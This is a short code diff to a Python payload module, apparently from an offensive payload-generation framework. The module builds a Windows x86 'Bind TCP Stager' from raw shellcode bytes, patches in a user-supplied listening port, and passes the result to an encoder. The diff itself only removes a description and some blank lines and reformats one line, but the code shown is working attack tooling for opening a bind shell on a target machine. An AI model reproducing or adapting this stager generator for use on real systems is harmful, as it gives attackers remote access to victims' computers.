@@ -7,8 +7,6 @@ from .xor import *
 class PayloadModule:
     def __init__(self, port):
         self.name = "Bind TCP Stager (Stage 1)"
-        self.description = "Binds to a user provided port and listens for\
-            fun files :)"
         self.cli_name = "bind_tcp"
         self.platform = "Windows"
         self.arch = "x86"
@@ -37,7 +35,6 @@ class PayloadModule:
             "\x29\xC6\x85\xF6\x75\xEC\xC3")
 
     def gen_shellcode(self):
-
         port_shellcode_stage = str(hex(self.lport).lstrip('0'))
         if len(port_shellcode_stage.lstrip('x')) == 3:
             # detect if odd number, is so, need to add a '0' to the front
@@ -68,6 +65,5 @@ class PayloadModule:
         stager_shellcode += port_shellcode.decode('string-escape')
         stager_shellcode += self.stager[self.port_offset + 2:]
 
-        self.customized_shellcode = "\\x" + '\\x'.join(stager_shellcode.encode('hex')[i:i+2] for i in range(0, len(stager_shellcode.encode('hex')), 2))
+        self.customized_shellcode = "\\x" + '\\x'.join(stager_shellcode.encode('hex')[i:i + 2] for i in range(0, len(stager_shellcode.encode('hex')), 2))
         return EncoderModule(self.customized_shellcode).do_the_magic()
-
